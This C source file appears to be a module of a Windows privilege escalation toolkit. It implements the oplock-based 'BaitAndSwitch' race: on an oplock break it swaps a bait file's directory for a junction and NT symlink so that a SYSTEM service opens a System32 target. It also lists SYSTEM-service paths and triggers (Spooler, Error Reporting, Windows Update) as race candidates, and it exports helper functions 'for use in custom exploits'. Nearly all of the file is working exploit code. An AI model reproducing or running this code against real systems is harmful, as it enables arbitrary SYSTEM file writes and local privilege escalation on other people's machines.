/*
 * oplock_race.c — Oplock-Based Race Condition (BaitAndSwitch) Primitives
 *
 * C reimplementation of Forshaw's BaitAndSwitch technique from:
 * https://github.com/googleprojectzero/symboliclink-testing-tools
 *
 * WHAT OPLOCKS ARE:
 *   Opportunistic Locks (oplocks) allow a client to get a "hint" from the
 *   filesystem that no other process has opened a file. When another process
 *   opens the file, the OS notifies the oplock holder (the "break") BEFORE
 *   completing the other process's open. This gives the oplock holder a
 *   window to modify the filesystem state before the other open completes.
 *
 * WHY THIS IS AN LPE PRIMITIVE:
 *   SYSTEM service opens file F (e.g., a temp config or DLL):
 *     1. Attacker creates F and sets an oplock on it
 *     2. SYSTEM service calls CreateFile(F) → triggers oplock break notification
 *     3. During the break (before SYSTEM's open completes):
 *        a. Attacker deletes F
 *        b. Creates junction: F's parent dir → \RPC Control\
 *        c. Creates NT symlink: \RPC Control\F → C:\Windows\System32\evil.dll
 *     4. SYSTEM's open resumes → follows junction+symlink → opens evil.dll
 *     5. SYSTEM reads/writes evil.dll as SYSTEM → arbitrary file write → LPE
 *
 * OPLOCK TYPES (Windows 7+):
 *   - READ oplock: breaks when writer opens
 *   - WRITE oplock: breaks when ANY other opener
 *   - HANDLE oplock: breaks when last handle closes
 *   - Legacy BATCH oplock: breaks immediately on any other open (widest window)
 *   - Filter oplock (FSFilter): used for AV-like scenarios
 *
 * BEST TYPE FOR RACE:
 *   BATCH oplock: gives the biggest race window (entire open is blocked)
 *   Windows 7+ READ|HANDLE: also works, more compatible
 *
 * REFERENCES:
 *   James Forshaw: "Bypassing User Account Control in Every Way"
 *   Forshaw: CVE-2020-0668 PoC (Service Tracing arbitrary file move)
 *   Forshaw: CVE-2019-0841 (AppX service symlink race)
 *   MSDN: Oplock Semantics (CreateFile FLAG_OVERLAPPED + FSCTL_REQUEST_*)
 *   Windows Internals 7th ed, Chapter 11: Oplocks
 */

#include "../common.h"
#include <winioctl.h>

/* -----------------------------------------------------------------------
 * Windows 7+ Oplock structures (not always in SDK headers)
 * --------------------------------------------------------------------- */
#ifndef FSCTL_REQUEST_OPLOCK
#define FSCTL_REQUEST_OPLOCK CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 144, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

#define OPLOCK_LEVEL_CACHE_READ   0x00000001
#define OPLOCK_LEVEL_CACHE_WRITE  0x00000002
#define OPLOCK_LEVEL_CACHE_HANDLE 0x00000004

typedef struct _REQUEST_OPLOCK_INPUT_BUFFER {
    USHORT StructureVersion;
    USHORT StructureLength;
    DWORD  RequestedOplockLevel;
    DWORD  Flags;
} REQUEST_OPLOCK_INPUT_BUFFER, *PREQUEST_OPLOCK_INPUT_BUFFER;

typedef struct _REQUEST_OPLOCK_OUTPUT_BUFFER {
    USHORT StructureVersion;
    USHORT StructureLength;
    DWORD  OriginalOplockLevel;
    DWORD  NewOplockLevel;
    DWORD  Flags;
    ACCESS_MASK AccessMode;
    USHORT ShareMode;
} REQUEST_OPLOCK_OUTPUT_BUFFER, *PREQUEST_OPLOCK_OUTPUT_BUFFER;

#define REQUEST_OPLOCK_CURRENT_VERSION          1
#define REQUEST_OPLOCK_INPUT_FLAG_REQUEST       0x00000001
#define REQUEST_OPLOCK_INPUT_FLAG_ACK           0x00000002
#define REQUEST_OPLOCK_OUTPUT_FLAG_ACK_REQUIRED 0x00000001

/* Legacy oplock FSCTLs (pre-Windows 7 style, wider compat) */
#ifndef FSCTL_REQUEST_BATCH_OPLOCK
#define FSCTL_REQUEST_BATCH_OPLOCK \
    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif
#ifndef FSCTL_OPLOCK_BREAK_ACKNOWLEDGE
#define FSCTL_OPLOCK_BREAK_ACKNOWLEDGE \
    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif
#ifndef FSCTL_REQUEST_FILTER_OPLOCK
#define FSCTL_REQUEST_FILTER_OPLOCK \
    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 23, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

/* -----------------------------------------------------------------------
 * Oplock race context
 * --------------------------------------------------------------------- */
typedef struct _OPLOCK_CTX {
    wchar_t  baitFilePath[MAX_PATH * 2];  /* file SYSTEM service will open */
    wchar_t  junctionDir[MAX_PATH * 2];   /* parent directory → will be junctioned */
    wchar_t  baitFileName[MAX_PATH];       /* just the filename component */
    wchar_t  ntSymlinkTarget[MAX_PATH * 2];/* where symlink should point */
    wchar_t  ntLinkName[MAX_PATH];         /* name in \RPC Control\ */

    HANDLE   hBaitFile;        /* handle to bait file (holds the oplock) */
    HANDLE   hBreakEvent;      /* manual-reset event signaled when break fires */
    HANDLE   hWorkerThread;    /* background thread waiting for break */
    OVERLAPPED ov;             /* overlapped I/O for oplock request */

    BOOL     useWin7Oplock;    /* TRUE = FSCTL_REQUEST_OPLOCK, FALSE = BATCH */
    BOOL     breakReceived;    /* set by worker thread */
    BOOL     swapDone;         /* set after junction+symlink swap */
    DWORD    timeoutMs;        /* how long to wait for break */
} OPLOCK_CTX;

/* -----------------------------------------------------------------------
 * Shared state for the oplock worker thread
 * --------------------------------------------------------------------- */
typedef struct _WORKER_STATE {
    OPLOCK_CTX *ctx;
    /* Fields used by win7 oplock path */
    REQUEST_OPLOCK_INPUT_BUFFER  inBuf;
    REQUEST_OPLOCK_OUTPUT_BUFFER outBuf;
} WORKER_STATE;

/* NT API for junction (reuse from symlink_primitives.c) */
extern BOOL CreateJunctionPoint(LPCWSTR junctionPath, LPCWSTR targetNTPath);
extern BOOL DeleteJunctionPoint(LPCWSTR junctionPath);
extern BOOL CreateNTSymlink(LPCWSTR linkDir, LPCWSTR linkName,
                             LPCWSTR target, HANDLE *hLinkOut);
extern BOOL DeleteNTSymlink(LPCWSTR linkDir, LPCWSTR linkName);

/* -----------------------------------------------------------------------
 * Worker thread: blocks on DeviceIoControl(FSCTL_REQUEST_OPLOCK)
 * When the oplock breaks, it fires the event so the main thread can swap.
 * --------------------------------------------------------------------- */
static DWORD WINAPI OplockWorkerThread(LPVOID param) {
    WORKER_STATE *ws = (WORKER_STATE*)param;
    OPLOCK_CTX   *ctx = ws->ctx;

    DWORD bytesReturned = 0;
    BOOL ok;

    if (ctx->useWin7Oplock) {
        /* Windows 7+ oplock: block until break */
        ws->inBuf.StructureVersion   = REQUEST_OPLOCK_CURRENT_VERSION;
        ws->inBuf.StructureLength    = sizeof(ws->inBuf);
        ws->inBuf.RequestedOplockLevel =
            OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
        ws->inBuf.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;

        ws->outBuf.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
        ws->outBuf.StructureLength  = sizeof(ws->outBuf);

        ok = DeviceIoControl(ctx->hBaitFile,
                              FSCTL_REQUEST_OPLOCK,
                              &ws->inBuf, sizeof(ws->inBuf),
                              &ws->outBuf, sizeof(ws->outBuf),
                              &bytesReturned, &ctx->ov);
        /* DeviceIoControl returns FALSE with ERROR_IO_PENDING for async */
        if (!ok && GetLastError() == ERROR_IO_PENDING) {
            /* Wait for break */
            WaitForSingleObject(ctx->ov.hEvent, ctx->timeoutMs);
            GetOverlappedResult(ctx->hBaitFile, &ctx->ov,
                                &bytesReturned, FALSE);
        }
    } else {
        /* Legacy BATCH oplock */
        ok = DeviceIoControl(ctx->hBaitFile,
                              FSCTL_REQUEST_BATCH_OPLOCK,
                              NULL, 0, NULL, 0,
                              &bytesReturned, &ctx->ov);
        if (!ok && GetLastError() == ERROR_IO_PENDING) {
            WaitForSingleObject(ctx->ov.hEvent, ctx->timeoutMs);
            GetOverlappedResult(ctx->hBaitFile, &ctx->ov,
                                &bytesReturned, FALSE);
        }
    }

    ctx->breakReceived = TRUE;
    SetEvent(ctx->hBreakEvent);
    free(ws); /* free the heap allocation made in OplockSetup */
    return 0;
}

/* -----------------------------------------------------------------------
 * Setup: create bait file, request oplock, start worker thread
 * --------------------------------------------------------------------- */
static BOOL OplockSetup(OPLOCK_CTX *ctx) {
    /* Create bait file (or verify it exists) */
    HANDLE hFile = CreateFileW(ctx->baitFilePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintInfo(L"    OplockSetup: cannot create bait file %s (err=%lu)\n",
                  ctx->baitFilePath, GetLastError());
        return FALSE;
    }
    ctx->hBaitFile = hFile;

    /* Overlapped event */
    ctx->ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ctx->ov.hEvent) {
        CloseHandle(hFile);
        ctx->hBaitFile = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    /* Break event */
    ctx->hBreakEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ctx->hBreakEvent) {
        CloseHandle(ctx->ov.hEvent);
        ctx->ov.hEvent = NULL;
        CloseHandle(hFile);
        ctx->hBaitFile = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    /* Start worker thread */
    WORKER_STATE *ws = (WORKER_STATE*)calloc(1, sizeof(*ws));
    if (!ws) { return FALSE; }
    ws->ctx = ctx;

    ctx->hWorkerThread = CreateThread(NULL, 0, OplockWorkerThread, ws, 0, NULL);
    if (!ctx->hWorkerThread) {
        free(ws);
        return FALSE;
    }

    /* Give thread time to set up the oplock before returning */
    Sleep(50);
    return TRUE;
}

/* -----------------------------------------------------------------------
 * Swap: called when oplock break is received
 * 1. Close bait file handle (release oplock)
 * 2. Delete bait file
 * 3. Create junction: baitFilePath's parent → \RPC Control\
 * 4. Create NT symlink: \RPC Control\baitFileName → ntSymlinkTarget
 * --------------------------------------------------------------------- */
static BOOL OplockSwap(OPLOCK_CTX *ctx) {
    PrintInfo(L"    [Oplock] Break received — performing junction+symlink swap...\n");

    /* Step 1: Close the bait file to release oplock */
    if (ctx->hBaitFile && ctx->hBaitFile != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hBaitFile);
        ctx->hBaitFile = INVALID_HANDLE_VALUE;
    }

    /* Step 2: Delete the bait file */
    if (!DeleteFileW(ctx->baitFilePath)) {
        PrintInfo(L"    [Oplock] Warning: cannot delete bait file (err=%lu)\n",
                  GetLastError());
        /* Continue anyway — junction will still redirect */
    }

    /* Step 3: Create junction on parent directory → \RPC Control\ */
    if (!CreateJunctionPoint(ctx->junctionDir, L"\\RPC Control")) {
        PrintInfo(L"    [Oplock] Cannot create junction on %s (err=%lu)\n",
                  ctx->junctionDir, GetLastError());
        return FALSE;
    }
    PrintInfo(L"    [Oplock] Junction: %s → \\RPC Control\\\n", ctx->junctionDir);

    /* Step 4: Create NT symlink in \RPC Control\ */
    HANDLE hLink = NULL;
    if (!CreateNTSymlink(L"\\RPC Control", ctx->ntLinkName,
                          ctx->ntSymlinkTarget, &hLink)) {
        PrintInfo(L"    [Oplock] Cannot create NT symlink \\RPC Control\\%s → %s\n",
                  ctx->ntLinkName, ctx->ntSymlinkTarget);
        /* Cleanup junction */
        DeleteJunctionPoint(ctx->junctionDir);
        return FALSE;
    }
    if (hLink) CloseHandle(hLink);

    PrintInfo(L"    [Oplock] NT symlink: \\RPC Control\\%s → %s\n",
              ctx->ntLinkName, ctx->ntSymlinkTarget);
    PrintInfo(L"    [Oplock] Swap complete — SYSTEM service will open %s\n",
              ctx->ntSymlinkTarget);

    ctx->swapDone = TRUE;
    return TRUE;
}

/* -----------------------------------------------------------------------
 * Cleanup: remove junction, symlink, temp files
 * --------------------------------------------------------------------- */
static void OplockCleanup(OPLOCK_CTX *ctx) {
    if (ctx->hBaitFile && ctx->hBaitFile != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hBaitFile);
        ctx->hBaitFile = INVALID_HANDLE_VALUE;
    }
    if (ctx->hWorkerThread) {
        WaitForSingleObject(ctx->hWorkerThread, 1000);
        CloseHandle(ctx->hWorkerThread);
        ctx->hWorkerThread = NULL;
    }
    if (ctx->ov.hEvent) {
        CloseHandle(ctx->ov.hEvent);
        ctx->ov.hEvent = NULL;
    }
    if (ctx->hBreakEvent) {
        CloseHandle(ctx->hBreakEvent);
        ctx->hBreakEvent = NULL;
    }

    /* Remove junction if we created it */
    if (ctx->swapDone) {
        DeleteJunctionPoint(ctx->junctionDir);
        DeleteNTSymlink(L"\\RPC Control", ctx->ntLinkName);
    }

    /* Remove bait file if still exists */
    DeleteFileW(ctx->baitFilePath);
}

/* -----------------------------------------------------------------------
 * Full race test: setup → wait → swap → verify → cleanup
 * --------------------------------------------------------------------- */
static BOOL RunOplockRaceTest(OPLOCK_CTX *ctx) {
    PrintInfo(L"    Bait file:      %s\n", ctx->baitFilePath);
    PrintInfo(L"    Junction dir:   %s → \\RPC Control\\\n", ctx->junctionDir);
    PrintInfo(L"    NT symlink:     \\RPC Control\\%s → %s\n",
              ctx->ntLinkName, ctx->ntSymlinkTarget);
    PrintInfo(L"    Oplock type:    %s\n",
              ctx->useWin7Oplock ? L"Windows 7+ READ|HANDLE" : L"Legacy BATCH");
    PrintInfo(L"    Timeout:        %lu ms\n\n", ctx->timeoutMs);

    if (!OplockSetup(ctx)) {
        PrintInfo(L"    [-] Oplock setup failed\n");
        return FALSE;
    }
    PrintInfo(L"    [+] Oplock placed on bait file — waiting for SYSTEM service to open it...\n");
    PrintInfo(L"        (Manually open %s from another process to trigger)\n\n",
              ctx->baitFilePath);

    /* Wait for break */
    DWORD waitResult = WaitForSingleObject(ctx->hBreakEvent, ctx->timeoutMs);
    if (waitResult == WAIT_TIMEOUT) {
        PrintInfo(L"    [Timeout] No oplock break within %lu ms\n", ctx->timeoutMs);
        PrintInfo(L"    [INFO] To test: open %s from any other process\n",
                  ctx->baitFilePath);
        OplockCleanup(ctx);
        return FALSE;
    }

    /* Perform the swap */
    BOOL swapped = OplockSwap(ctx);
    if (!swapped) {
        PrintInfo(L"    [-] Swap failed\n");
        OplockCleanup(ctx);
        return FALSE;
    }

    /* Brief pause to let SYSTEM service complete its open */
    Sleep(100);

    PrintInfo(L"    [+] Race complete — check if %s was accessed\n\n",
              ctx->ntSymlinkTarget);
    OplockCleanup(ctx);
    return TRUE;
}

/* -----------------------------------------------------------------------
 * Enumerate common TOCTOU targets — known SYSTEM service file paths
 * that are accessible via oplock+symlink race
 * --------------------------------------------------------------------- */
static void AuditOplockCandidates(DWORD *findings) {
    PrintInfo(L"  [1] Common oplock race candidates (SYSTEM service → user-path):\n\n");

    typedef struct {
        const wchar_t *envBase;    /* base path (env var or literal) */
        const wchar_t *relPath;    /* relative subpath */
        const wchar_t *service;    /* SYSTEM service that uses this path */
        const wchar_t *trigger;    /* how to trigger the access */
        const wchar_t *cve;        /* known CVE if any */
    } CANDIDATE;

    static const CANDIDATE CANDIDATES[] = {
        {
            L"%SystemRoot%\\System32\\LogFiles\\WMI\\",
            L"",
            L"WMI Tracing (WmiApSrv) — NETWORK SERVICE",
            L"Enable WMI tracing: wevtutil sl Microsoft-Windows-WMI-Activity/Trace /e:true",
            L"(class — no specific CVE)"
        },
        {
            L"%LOCALAPPDATA%\\Temp\\",
            L"",
            L"Various SYSTEM services writing temp files",
            L"Trigger specific service operation (ProcMon → identify temp file)",
            L"Generic pattern"
        },
        {
            L"%SystemRoot%\\Temp\\",
            L"",
            L"Windows Update / TiWorker.exe (SYSTEM)",
            L"wuauclt.exe /detectnow or run Windows Update",
            L"CVE-2020-0668 class (Service Tracing)"
        },
        {
            L"%SystemRoot%\\System32\\spool\\PRINTERS\\",
            L"",
            L"Spooler service (spoolsv.exe — SYSTEM)",
            L"Print any document",
            L"PrintNightmare class"
        },
        {
            L"%PROGRAMDATA%\\Microsoft\\Windows\\WER\\",
            L"ReportQueue\\",
            L"Windows Error Reporting (WerSvc — LOCAL SYSTEM)",
            L"Crash any application",
            L"CVE-2019-1315 class"
        },
        {
            L"%SystemRoot%\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\",
            L"",
            L"SYSTEM user temp (many services write here)",
            L"Trigger any SYSTEM service that writes temp files",
            L"Generic"
        },
        { NULL, NULL, NULL, NULL, NULL }
    };

    for (int i = 0; CANDIDATES[i].envBase; i++) {
        wchar_t fullPath[MAX_PATH * 2] = {0};
        ExpandEnvironmentStringsW(CANDIDATES[i].envBase, fullPath, _countof(fullPath));
        if (*CANDIDATES[i].relPath)
            wcsncat(fullPath, CANDIDATES[i].relPath,
                    _countof(fullPath) - wcslen(fullPath) - 1);

        BOOL exists = (GetFileAttributesW(fullPath) != INVALID_FILE_ATTRIBUTES &&
                       (GetFileAttributesW(fullPath) & FILE_ATTRIBUTE_DIRECTORY));

        PrintInfo(L"    [%s] %s\n"
                  L"         Service: %s\n"
                  L"         Trigger: %s\n"
                  L"         CVE:     %s\n\n",
                  exists ? L"EXISTS" : L"NOT FOUND",
                  fullPath,
                  CANDIDATES[i].service,
                  CANDIDATES[i].trigger,
                  CANDIDATES[i].cve);

        if (exists) (*findings)++;
    }
}

/* Thread that opens a file to trigger an oplock break (used by OplockSelfTest).
 * Must be at file scope — nested functions are not valid C. */
static DWORD WINAPI SelfTestTriggerThread(LPVOID param) {
    LPCWSTR path = (LPCWSTR)param;
    HANDLE h = CreateFileW(path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
    return 0;
}

/* -----------------------------------------------------------------------
 * Self-test: verify oplock mechanism works on this system
 * Uses a temp file that we open ourselves to trigger the break
 * --------------------------------------------------------------------- */
static void OplockSelfTest(void) {
    PrintInfo(L"  [2] Oplock self-test (verify primitive works on this OS):\n");

    wchar_t tempPath[MAX_PATH] = {0};
    wchar_t testFile[MAX_PATH * 2] = {0};
    GetTempPathW(_countof(tempPath), tempPath);
    _snwprintf(testFile, _countof(testFile), L"%sFerrum_OplockTest_%lu.tmp",
               tempPath, GetCurrentProcessId());

    /* Create test file */
    HANDLE hFile = CreateFileW(testFile,
        GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintInfo(L"    Cannot create test file (err=%lu)\n\n", GetLastError());
        return;
    }

    /* Request batch oplock */
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    OVERLAPPED ov = {0};
    ov.hEvent = hEvent;

    DWORD returned = 0;
    BOOL ok = DeviceIoControl(hFile, FSCTL_REQUEST_BATCH_OPLOCK,
                               NULL, 0, NULL, 0, &returned, &ov);

    BOOL oplockSupported = (!ok && GetLastError() == ERROR_IO_PENDING);

    if (oplockSupported) {
        PrintInfo(L"    [+] Batch oplock: SUPPORTED (ERROR_IO_PENDING as expected)\n");

        /* Trigger break from a SEPARATE THREAD to avoid deadlock.
         * CreateFileW on a batch-oplocked file blocks until the oplock holder ACKs.
         * Calling it on the same thread that holds the oplock → stuck waiting for self.
         * Fix: trigger from thread, main waits for break, then ACKs by closing hFile. */
        HANDLE hTrigger = CreateThread(NULL, 0, SelfTestTriggerThread,
                                        (LPVOID)testFile, 0, NULL);

        DWORD waitRes = WaitForSingleObject(hEvent, 2000);
        if (waitRes == WAIT_OBJECT_0) {
            PrintInfo(L"    [+] Oplock break received successfully — race primitive WORKS\n");
        } else {
            PrintInfo(L"    [-] Oplock break timeout (err=%lu)\n", GetLastError());
        }

        /* ACK: close oplock handle → kernel allows trigger thread's CreateFileW to proceed */
        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
        if (hTrigger) { WaitForSingleObject(hTrigger, 1000); CloseHandle(hTrigger); }
    } else {
        PrintInfo(L"    [-] Batch oplock not supported (err=%lu)\n", GetLastError());
    }

    /* Win7+ oplock test — needs a fresh file handle (batch test may have closed hFile) */
    if (hFile == INVALID_HANDLE_VALUE) {
        hFile = CreateFileW(testFile,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    }

    if (hFile != INVALID_HANDLE_VALUE) {
        ResetEvent(hEvent);
        memset(&ov, 0, sizeof(ov));
        ov.hEvent = hEvent;

        REQUEST_OPLOCK_INPUT_BUFFER inBuf = {0};
        inBuf.StructureVersion    = REQUEST_OPLOCK_CURRENT_VERSION;
        inBuf.StructureLength     = sizeof(inBuf);
        inBuf.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
        inBuf.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;

        REQUEST_OPLOCK_OUTPUT_BUFFER outBuf = {0};
        outBuf.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
        outBuf.StructureLength  = sizeof(outBuf);

        ok = DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK,
                              &inBuf, sizeof(inBuf),
                              &outBuf, sizeof(outBuf),
                              &returned, &ov);
        if (!ok && GetLastError() == ERROR_IO_PENDING) {
            PrintInfo(L"    [+] Windows 7+ READ|HANDLE oplock: SUPPORTED\n");
        } else {
            PrintInfo(L"    [-] Windows 7+ oplock: not available (err=%lu) — use BATCH\n",
                      GetLastError());
        }

        CloseHandle(hFile); /* close file first → cancels pending I/O → safe to close event */
    }

    CloseHandle(hEvent);
    DeleteFileW(testFile);
    PrintInfo(L"\n");
}

/* -----------------------------------------------------------------------
 * Interactive demo: setup race on user-specified file + target
 * In enumeration mode, just shows the template
 * --------------------------------------------------------------------- */
static void ShowRaceTemplate(void) {
    PrintInfo(
        L"  [3] BaitAndSwitch race template:\n\n"
        L"      To exploit a TOCTOU race on a specific SYSTEM service path:\n\n"
        L"      1. Identify bait file path (from ProcMon or --SYMLINKCAN module):\n"
        L"         Example: C:\\Users\\<user>\\AppData\\Temp\\svc_tempdir\\payload.dll\n\n"
        L"      2. Run Ferrum/C with race active (interactive mode):\n"
        L"         ferrum.exe --OPLOCKRACE\n"
        L"         → Places oplock on bait file\n"
        L"         → Waits for SYSTEM service to open it\n"
        L"         → On break: swaps parent dir to junction → \\RPC Control\\\n"
        L"         →           creates \\RPC Control\\payload.dll → System32\\target\n"
        L"         → SYSTEM service completes open on System32\\target\n\n"
        L"      3. Verify: check if System32\\target was written with your content\n\n"
        L"      Code path in this module:\n"
        L"         OplockSetup() → [wait] → OplockSwap() → OplockCleanup()\n\n"
        L"      Key functions exported for use in custom exploits:\n"
        L"         CreateJunctionPoint(junctionPath, ntTarget)\n"
        L"         CreateNTSymlink(ntDir, linkName, target, &hOut)\n"
        L"         DeleteJunctionPoint(junctionPath)\n"
        L"         DeleteNTSymlink(ntDir, linkName)\n\n");
}

/* -----------------------------------------------------------------------
 * Module entry point
 * --------------------------------------------------------------------- */
void Module_OplockRace(void) {
    PrintHeader(
        L"OPLOCK RACE CONDITION  "
        L"[BaitAndSwitch: oplock break → junction+symlink swap → arbitrary SYSTEM file access]");

    PrintInfo(
        L"  Based on: Forshaw's BaitAndSwitch technique (Project Zero)\n"
        L"  CVE-2020-0668 (Service Tracing), CVE-2019-0841 (AppX service)\n"
        L"  Oplock break gives race window to swap file for junction+symlink.\n\n");

    DWORD findings = 0;
    OplockSelfTest();
    AuditOplockCandidates(&findings);
    ShowRaceTemplate();

    if (findings > 0) {
        PrintInfo(
            L"  Found %lu candidate paths that SYSTEM services access.\n"
            L"  Use --SYMLINKPRIM to verify junction+symlink chain viability,\n"
            L"  then manually trigger the SYSTEM service to complete the race.\n",
            findings);
    }
}
